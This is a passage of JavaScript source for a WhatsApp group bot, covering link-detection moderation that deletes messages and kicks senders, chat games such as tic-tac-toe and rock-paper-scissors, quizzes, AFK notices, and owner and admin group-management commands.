   if (budy.includes("https://facebook.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`ã€Œ Facebook Link Detected ã€\`\`\`\n\nAdmin has sent a facebook link, admin is free to send any linkðŸ˜‡`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`ã€Œ Facebook Link Detected ã€\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending facebook link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by xeon
if (AntiLinkTelegram)
   if (budy.includes("https://t.me/")){
if (AntiLinkTelegram)
if (!isBotAdmins) return
bvl = `\`\`\`ã€Œ Telegram Link Detected ã€\`\`\`\n\nAdmin has sent a telegram link, admin is free to send any linkðŸ˜‡`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`ã€Œ Telegram Link Detected ã€\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending telegram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink tiktok by xeon
if (AntiLinkTiktok)
   if (budy.includes("https://www.tiktok.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`ã€Œ Tiktok Link Detected ã€\`\`\`\n\nAdmin has sent a tiktok link, admin is free to send any linkðŸ˜‡`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`ã€Œ Tiktok Link Detected ã€\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending tiktok link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink twitter by xeon
if (AntiLinkTwitter)
   if (budy.includes("https://twitter.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`ã€Œ Twitter Link Detected ã€\`\`\`\n\nAdmin has sent a twitter link, admin is free to send any linkðŸ˜‡`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`ã€Œ Tiktok Link Detected ã€\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending twitter link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink all by xeon
if (AntiLinkAll)
   if (budy.includes("https://")){
if (!isBotAdmins) return
bvl = `\`\`\`ã€Œ Link Detected ã€\`\`\`\n\nAdmin has sent a link, admin is free to send any linkðŸ˜‡`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`ã€Œ Link Detected ã€\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

        //auto reply by xeon
  if (Autoreply)
        for (let anji of xeonysticker){
				if (budy === anji){
					result = fs.readFileSync(`./XeonMedia/sticker/${anji}.webp`)
					XeonBotInc.sendMessage(m.chat, { sticker: result }, { quoted: m })
					}
			}
			  if (Autoreply)
			for (let anju of xeonyaudio){
				if (budy === anju){
					result = fs.readFileSync(`./XeonMedia/audio/${anju}.mp3`)
					XeonBotInc.sendMessage(m.chat, { audio: result, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
					}
			}
			  if (Autoreply)
			for (let anjh of xeonyimage){
				if (budy === anjh){
					result = fs.readFileSync(`./XeonMedia/image/${anjh}.jpg`)
					XeonBotInc.sendMessage(m.chat, { image: result }, { quoted: m })
					}
			}
			  if (Autoreply) 
					for (let anjh of xeonyvideo){
				if (budy === anjh){
					result = fs.readFileSync(`./XeonMedia/video/${anjh}.mp4`)
					XeonBotInc.sendMessage(m.chat, { video: result }, { quoted: m })
					}
				  }

      // Mute Chat
      if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }

//emoji 
const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI();
emoji.get(satu)
.then(emoji => {
const buttons = [{buttonId: "y", buttonText: {displayText:satu}, type: 1}]
const buttonMessage = {image: {url: emoji.images[dua].url},caption: "Here you go!",footerText: `${botname}`,buttons: buttons,headerType: 4}
XeonBotInc.sendMessage(from, buttonMessage, {quoted:m})
})
} catch (e) {
m.reply("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
}
}
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
    userJid: XeonBotInc.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, XeonBotInc.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
XeonBotInc.ev.emit('messages.upsert', msg)
}

//guess song
        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await XeonBotInc.sendButtonText(m.chat, [{ buttonId: 'guess song', buttonText: { displayText: 'Guess The Song' }, type: 1 }], `ðŸŽ® Guess The Music ðŸŽ®\n\nCorrect Answer ðŸŽ‰\n\nWant To Play Again? Press The Button Below`, XeonBotInc.user.name, m)
                delete tebaklagu[m.sender.split('@')[0]]
            } else m.reply('*Wrong answer!*')
        }
        
        //TicTacToe\\
	    this.game = this.game ? this.game : {}
	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    //reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?give up|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) { 
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    reply({
	    '-3': 'Game Has Ended',
	    '-2': 'Invalid',
	    '-1': 'Invalid Position',
	    0: 'Invalid Position',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: 'âŒ',
	    O: 'â­•',
	    1: '1ï¸âƒ£',
	    2: '2ï¸âƒ£',
	    3: '3ï¸âƒ£',
	    4: '4ï¸âƒ£',
	    5: '5ï¸âƒ£',
	    6: '6ï¸âƒ£',
	    7: '7ï¸âƒ£',
	    8: '8ï¸âƒ£',
	    9: '9ï¸âƒ£',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game Over` : `Turn ${['âŒ', 'â­•'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
âŒ: @${room.game.playerX.split('@')[0]}
â­•: @${room.game.playerO.split('@')[0]}

Type *surrender* to surrender and admit defeat`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room.x !== room.o) await XeonBotInc.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await XeonBotInc.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room.id]
	    }
	    }

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
	    XeonBotInc.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    XeonBotInc.sendText(m.chat, `Suit has been sent to chat

@${roof.p.split`@`[0]} and 
@${roof.p2.split`@`[0]}

Please choose a suit in the respective chat"
click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) XeonBotInc.sendText(roof.p, `Please Select \n\RockðŸ—¿\nPaperðŸ“„\nScissorsâœ‚ï¸`, m)
	    if (!roof.pilih2) XeonBotInc.sendText(roof.p2, `Please Select \n\nRockðŸ—¿\nPaperðŸ“„\nScissorsâœ‚ï¸`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) XeonBotInc.sendText(m.chat, `Both Players Don't Want To Play,\nSuit Canceled`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    XeonBotInc.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Didn't Choose Suit, Game Over!`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /scissors/i
	    let b = /rock/i
	    let k = /paper/i
	    let reg = /^(scissors|rock|paper)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    m.reply(`You have chosen ${m.text} ${!roof.pilih2 ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih2) XeonBotInc.sendText(roof.p2, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    m.reply(`You have chosen ${m.text} ${!roof.pilih ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih) XeonBotInc.sendText(roof.p, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    XeonBotInc.sendText(roof.asal, `_*Suit Results*_${tie ? '\nSERIES' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost  \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    }
	    
	    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	    for (let jid of mentionUser) {
            let user = global.db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            m.reply(`
Don't tag him!
He's in AFK ${reason ? 'with reason ' + reason : 'no reason'}
During ${clockString(new Date - afkTime)}
`.trim())
        }

        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            m.reply(`
You stop AFK${user.afkReason ? ' after ' + user.afkReason : ''}
During ${clockString(new Date - user.afkTime)}
`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }
        
        //menu image randomizer
	let picaks = [flaming,fluming,flarun,flasmurf]
	let picak = picaks[Math.floor(Math.random() * picaks.length)]
	
	//menu doc randomizer
let documents = [doc1,doc2,doc3,doc4,doc5,doc6]
let docs = pickRandom(documents)

//swtich case
        switch(command) {
	case 'afk': {
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                m.reply(`${m.pushName} *Already Afk*${text ? ': ' + text : ''}`)
            }
            break	
                case 'ttc': case 'ttt': case 'tictactoe': {
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return m.reply(`You Are Still In The Game`)
            let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
            if (room) {
            room.o = m.chat
            room.game.playerO = m.sender
            room.state = 'PLAYING'
            let arr = room.game.render().map(v => {
            return {
            X: 'âŒ',
            O: 'â­•',
            1: '1ï¸âƒ£',
            2: '2ï¸âƒ£',
            3: '3ï¸âƒ£',
            4: '4ï¸âƒ£',
            5: '5ï¸âƒ£',
            6: '6ï¸âƒ£',
            7: '7ï¸âƒ£',
            8: '8ï¸âƒ£',
            9: '9ï¸âƒ£',
            }[v]
            })
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Waiting @${room.game.currentTurn.split('@')[0]}

Type *surrender* to surrender and admit defeat`
            if (room.x !== room.o) await XeonBotInc.sendText(room.x, str, m, { mentions: parseMention(str) } )
            await XeonBotInc.sendText(room.o, str, m, { mentions: parseMention(str) } )
            } else {
            room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room.name = text
            m.reply('Waiting For Partner' + (text ? ` Type The Command Below ${prefix}${command} ${text}` : ''))
            this.game[room.id] = room
            }
            }
            break
            case 'delttc': case 'delttt': {
            this.game = this.game ? this.game : {}
            try {
            if (this.game) {
            delete this.game
            XeonBotInc.sendText(m.chat, `Successfully deleted TicTacToe session`, m)
            } else if (!this.game) {
            m.reply(`Session TicTacToeðŸŽ® does not exist`)
            } else throw '?'
            } catch (e) {
            m.reply('damaged')
            }
            }
            break
            case 'suitpvp':case 'rps': case 'rockpaperscissors':case 'suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Complete your previous game`)
	    if (m.mentionedJid[0] === m.sender) return m.reply(`Can't play with myself !`)
            if (!m.mentionedJid[0]) return m.reply(`_Who do you want to challenge?_\nTag the person..\n\nExample : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `The person you are challenging is playing suit with someone else :(`
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} *Challenged* @${m.mentionedJid[0].split`@`[0]} *to play suit*

*Hi* @${m.mentionedJid[0].split`@`[0]} *Please type accept to accept or type reject to reject`
            this.suit[id] = {
            chat: await XeonBotInc.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) XeonBotInc.sendText(m.chat, `_Suit time out_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break
            case 'chat': {
                if (!isCreator) throw mess.owner
                if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
                if (args[0] === 'mute') {
                    XeonBotInc.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unmute') {
                    XeonBotInc.chatModify({ mute: null }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'archive') {
                    XeonBotInc.chatModify({  archive: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unarchive') {
                    XeonBotInc.chatModify({ archive: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'read') {
                    XeonBotInc.chatModify({ markRead: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unread') {
                    XeonBotInc.chatModify({ markRead: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'delete') {
                    XeonBotInc.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break

            case 'guess': {
                if (!args.join(" ")) throw `Example : ${prefix + command} song`
if (args[0] === "song") {
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
let anugas = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/guessSong.json')
let result = anugas[Math.floor(Math.random() * anugas.length)]
let msg = await XeonBotInc.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
XeonBotInc.sendText(m.chat, `What is the name of this song?\n\nArtist : ${result.artist}\nTime : 60s`, msg).then(() => {
tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer: " + result.jawaban)
XeonBotInc.sendButtonText(m.chat, [{ buttonId: 'guess song', buttonText: { displayText: 'Guess the song' }, type: 1 }], `Time has run out\nAnswer:  ${tebaklagu[m.sender.split('@')[0]]}\n\nWant to play? press the button below`, `${global.botname}`, m)
delete tebaklagu[m.sender.split('@')[0]]
}
}
}
break
            case 'matchquiz': case 'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
                let { genMath, modes } = require('./lib/math')
                if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nUsage example: ${prefix}math medium`
                let result = await genMath(text.toLowerCase())
                XeonBotInc.sendText(m.chat, `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} second`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    m.reply("Time has run out\nAnswer: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
  case 'slot': {
            const somtoy = solot[Math.floor(Math.random() * solot.length)]
            let sloth =`[  ðŸŽ°VIRTUAL SLOT ðŸŽ°  ]\n------------------------\n\nðŸ’ : ðŸŒ : ðŸ‡\n${somtoy}<=====\nðŸ‡ : ðŸŒ : ðŸ’\n\n------------------------\n[  ðŸŽ° VIRTUAL SLOT ðŸŽ°  ]\n\n*Information* :\n_If you get 3 of the same fruit_\n_Means You Win_\n\n_Example : ðŸ’ : ðŸ’ : ðŸ’_ <=====`
            let buttons = [{ buttonId: 'slot', buttonText: { displayText: 'ðŸŽ°PLAY AGAINðŸŽ°' }, type: 1 }]
            await XeonBotInc.sendButtonText(m.chat, buttons, sloth, botname, m)
            }
            break
            case 'soulmate': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `ðŸ‘«Your Soulmate Is

@${me.split('@')[0]} â¤ï¸ @${jodoh.split('@')[0]}`
            let ments = [me, jodoh]
            let buttons = [
                        { buttonId: 'â¤ï¸', buttonText: { displayText: 'â¤ï¸' }, type: 1 }
                    ]
                    await XeonBotInc.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: ments})
            }
            break
            case 'couple': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `@${orang.split('@')[0]} â¤ï¸ @${jodoh.split('@')[0]}
Cieeee, What's Going Onâ¤ï¸ðŸ’–ðŸ‘€`
            let menst = [orang, jodoh]
            let buttons = [
                        { buttonId: 'â¤ï¸', buttonText: { displayText: 'â¤ï¸' }, type: 1 }
                    ]
                    await XeonBotInc.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: menst})
            }
            break
            case 'buttonmaker': {
            if (!isPremium) throw mess.premime
			if (!text) throw `Example : ${prefix + command} hi|hello`
            let jawab = `${text.split("|")[0]}`
            let buttons = [{ buttonId: 'menu', buttonText: { displayText: `${themeemoji}` }, type: 1 }]
            await XeonBotInc.sendButtonText(m.chat, buttons, jawab, `${text.split("|")[1]}`, m)
            }
            break
            
            case 'react': {
                if (!isCreator) throw mess.owner
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                XeonBotInc.sendMessage(m.chat, reactionMessage)
            }
            break  
            case 'join': {
                if (!isCreator) throw mess.owner
                if (!text) throw 'Enter the group link!'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
                m.reply(mess.wait)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await XeonBotInc.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'leavegc': {
                if (!isCreator) throw mess.owner
                await XeonBotInc.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'setexif': {
               if (!isCreator) throw mess.owner
               if (!text) throw `Example : ${prefix + command} packname|author`
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          m.reply(`Exif has been successfully changed to\n\n${themeemoji} Packname : ${global.packname}\n${themeemoji} Author : ${global.author}`)
            }
            break
	case 'kick': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'add': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'promote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'demote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'block': {
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await XeonBotInc.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'unblock': {
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await XeonBotInc.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	    case 'setname': case 'setsubject': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await XeonBotInc.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setdesc': case 'setdesk': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await XeonBotInc.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setbotpp': {
                if (!isCreator) throw mess.owner
                if (!quoted) throw `Send/Reply Image With Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Send/Reply Image With Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Send/Reply Image With Caption ${prefix + command}`
                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                await XeonBotInc.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
           case 'setgrouppp': case 'setgruppp': case 'setgcpp': {
                if (!m.isGroup) throw mess.group
                if (!isAdmins) throw mess.admin
                if (!quoted) throw `Send/Reply Image With Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Send/Reply Image With Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Send/Reply Image With Caption ${prefix + command}`
                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                await XeonBotInc.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
            case 'tagall': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
let teks = `â•šÂ»Ë™Î‡Ù ${themeemoji}â—â™¥ Tag All â™¥â—${themeemoji}Ù Î‡Ë™Â«â• 
 
 ðŸŒ¿ *Message : ${q ? q : 'empty'}*\n\n`
                for (let mem of participants) {
                teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
                }
                XeonBotInc.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
                }
                break
                case 'hidetag': {
            if (!m.isGroup) throw mess.group
            if (!isBotAdmins) throw mess.botAdmin
            if (!isAdmins) throw mess.admin
            XeonBotInc.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
            }
            break
	    case 'style': case 'styletext': {
	        if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // response when limit runs out
		db.data.users[m.sender].limit -= 1 // -1 limit
		let { styletext } = require('./lib/scraper')
		if (!text) throw 'Enter Query text!'
                let anu = await styletext(text)
                let teks = `Style Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
                }
                m.reply(teks)
	    }
	    break
               case 'vote': {
